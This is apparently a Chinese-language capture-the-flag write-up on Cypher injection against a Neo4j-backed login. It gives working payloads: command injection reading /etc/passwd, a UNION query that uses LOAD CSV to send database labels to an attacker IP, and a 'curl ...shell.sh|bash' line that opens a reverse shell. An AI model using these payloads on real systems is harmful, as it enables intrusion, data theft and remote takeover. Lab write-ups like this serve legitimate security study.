# cypher 注入

在不知道账密的情况下，先发个包看看吧
{"username": "admin","password": "password"}

在题目名称的提示下，借助 ai 给了一段 sypher 注入的 payload
{"username": "admin' CALL custom.getUrlStatusCode('cypher.htb; cat /etc/passwd');//","password": "password"}
回显长这样

实锤了啊，就是注入不太对，这下直接 ai 仙人启动了，库库调教说是
{"username":"admin' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.42/?l='+label as l RETURN 0 as _0 //","password":"password"}
这是一段测试代码，通过 RETURN 0 as _0 进行占位，保证 union 前后列数一致，由先前报错得知，会返回 h.hash，所以注入字段也需要返回一个 _0
为了测试是否成功，通过 CALL db.labels() 这个 neo4j 的内置过程，返回所有节点的标签
而 yield label 则用于提取结果并储存在 label 变量中
为了能够看到返回结果，通过 LOAD CSV 来发起 http 请求，外带信息到本地
再次使用 RETURN 0 as _0 确保查询完整性，避免语法错误

成功注入


接下来开始尝试反弹 shell
在本地将反弹 shell 语句写入 shell.sh

然后监听 8888 端口
yakit 抓包注入
return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.htb;curl 10.10.16.42/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//
利用 curl 下载本地的 shell.sh
通过管道｜传递到 bash 执行，从而达到反弹 shell 的目的
